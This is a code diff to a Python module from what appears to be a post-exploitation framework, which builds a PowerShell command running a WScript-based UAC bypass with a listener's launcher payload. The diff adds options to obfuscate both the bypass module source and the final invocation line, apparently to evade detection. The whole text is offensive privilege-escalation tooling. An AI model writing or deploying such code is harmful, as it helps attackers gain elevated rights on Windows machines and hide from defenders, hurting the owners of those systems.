@@ -73,7 +73,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         listenerName = self.options['Listener']['Value']
 
@@ -84,7 +84,9 @@ class Module:
 
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-WScriptBypassUAC.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -108,5 +110,8 @@ class Module:
                 print helpers.color("[!] Error in launcher generation.")
                 return ""
             else:
-                script += "Invoke-WScriptBypassUAC -payload \"%s\"" % (launcher)
+                scriptEnd = "Invoke-WScriptBypassUAC -payload \"%s\"" % (launcher)
+                if obfuscate:
+                    scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+                script += scriptEnd
                 return script
